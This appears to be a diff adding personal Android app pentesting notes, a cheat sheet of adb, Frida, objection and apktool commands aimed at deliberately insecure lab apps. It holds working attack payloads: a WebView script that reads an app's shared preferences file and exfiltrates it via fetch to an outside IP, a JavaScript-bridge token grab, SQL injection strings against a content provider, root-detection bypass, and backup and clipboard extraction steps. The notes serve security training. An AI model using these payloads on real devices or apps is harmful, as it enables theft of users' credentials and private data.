@@ -1,0 +1,214 @@
+adb devices
+adb -s device-id shell
+pm list packages
+adb shell pm path com.android.messaging
+adb uninstall com.android.messaging
+adb install chrome.apk
+
+pm list packages
+pm path package_name
+
+sqllite3 filename
+
+adb shell am start -n com.example.intentinjection/.Dashboard -e username 'hacker'
+adb shell am broadcast -p com.example.insecurebroadcastreceiver -a theBroadcast -e mobile '000' -e password "123456"
+
+apktool d app.apk 
+apktool b --use-aapt2 appFolderName
+
+
+
+adb shell am start -n com.example.insecurewebview/.RegistrationWebView -e reg_url 'http://138.68.182.36:999/'
+
+
+save test.html 
+<script>
+    var url = 'file:///data/data/com.example.insecurewebview/shared_prefs/MainActivity.xml'; 
+    function load(url) {
+        var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                fetch('http://138.68.182.36:999/?data=' + encodeURIComponent(btoa(xhr.responseText)));
+            }
+        }
+        xhr.open('GET', url, true);
+        xhr.send('');
+    }
+load(url);
+</script>
+
+
+adb push test.html /mnt/sdcard/test.html
+adb shell am start -n com.example.insecurewebview/.RegistrationWebView --es reg_url "file:///mnt/sdcard/test.html"
+
+
+<script type="text/javascript">
+alert("token: " + Android.getUserToken());
+</script>
+
+
+adb shell am start -n com.example.insecurewebview/.SupportWebView -e support_url 'http://138.68.182.36:999/test2.html'
+
+
+adb shell am stopservice com.example.insecureservice/.RecorderService
+adb shell am startservice com.example.insecureservice/.RecorderService
+
+
+adb shell
+content query --uri content://com.example.insecurecontentprovider.DataUserContentProvider/datausers/ --projection  "*"
+content query --uri content://com.example.insecurecontentprovider.DataUserContentProvider/datausers/ --projection  "'"
+content query --uri content://com.example.insecurecontentprovider.DataUserContentProvider/datausers/ --projection  "* from sqlite_master --"
+content insert --uri content://com.example.insecurecontentprovider.DataUserContentProvider/datausers/  --bind name:s:"x2" 
+
+
+
+' -> test 
+
+' or 1=1 --
+
+admin' order by 1 -- 
+admin' order by 2 -- 
+admin' order by 3 -- 
+admin' order by 4 -- 
+
+admin' union select 1,2,3 -- 
+
+
+sqlite_version() -> 
+
+sqlite_master
+
+limit 0,1 
+
+sql -> table - column and ... 
+
+admin' union select 1,2,3 from sqlite_master -- 
+
+
+brew install jadx
+
+pip3 install frida-tools
+pip3 install frida
+pip3 install --upgrade frida
+pip3 install --upgrade frida-tools
+pip3 install frida-dexdump
+frida-dexdump -U -f com.app.pkgname
+
+
+frida –version
+
+download frida-server-15.1.15-android-x86.xz https://github.com/frida/frida/releases
+unzip 
+adb root 
+adb push frida-server /data/local/tmp/
+adb shell "chmod 755 /data/local/tmp/frida-server"
+adb shell "/data/local/tmp/frida-server &"
+
+frida-ps -U #List packages and processes
+frida-ps -U | grep -i <part_of_the_package_name> 
+
+
+frida -l code.js -f com.example.frida1 -U
+%resume
+
+
+
+
+adb shell
+settings put global http_proxy 192.168.1.100:8080
+settings put global http_proxy 172.16.246.1:8080
+settings get global http_proxy
+
+in android open : http://172.16.246.1:8080 -> download ca -> der ->  rename name.cer
+
+for disable : settings put global http_proxy :0
+
+
+
+
+adb logcat 
+adb logcat | grep pid 
+
+
+https://codeshare.frida.re/
+
+https://codeshare.frida.re/@dzonerzy/fridantiroot/
+
+
+
+frida --codeshare dzonerzy/fridantiroot -f com.app -U
+
+%resume
+
+frida -l file.js -f com.app -U
+
+
+
+
+allow backup:
+
+adb backup -apk package_name 
+
+java -jar abe.jar unpack backup.ab backup.tar
+
+https://github.com/nelenkov/android-backup-extractor
+
+
+clipboard sensitive : 
+ls -l /data/data | grep package_name # get uid  
+su uid 
+service call clipboard 2 s16 package_name
+
+disable copy/paste sensitive edit text
+
+EditTextUsername.setLongClickable(false);
+
+longClickable="false"
+
+
+
+
+
+
+adb shell
+content query --uri content://com.example.insecurecontentprovider2.Notesprovider/notes
+
+
+https://github.com/sensepost/objection
+pip3 install -U objection
+
+objection -g package_name explore
+memory dump all file.txt
+strings file.txt
+
+
+
+
+android:allowBackup="true" -> android:allowBackup="false"
+
+
+https://www.buaq.net/go-18096.html
+
+
+
+
+android-x86 :
+
+mount -o remount,rw /mnt
+vi /mnt/grub/menu.lst
+nomodeset xforcevesa
+:wq 
+reboot
+
+
+adb connect 172.16.246.146:5555
+scrcpy -s
+
+https://github.com/Genymobile/scrcpy
+
+
+adb shell settings put global verifier_verify_adb_installs 0
+
+
+
+https://github.com/wushenwu/frida_script_collections
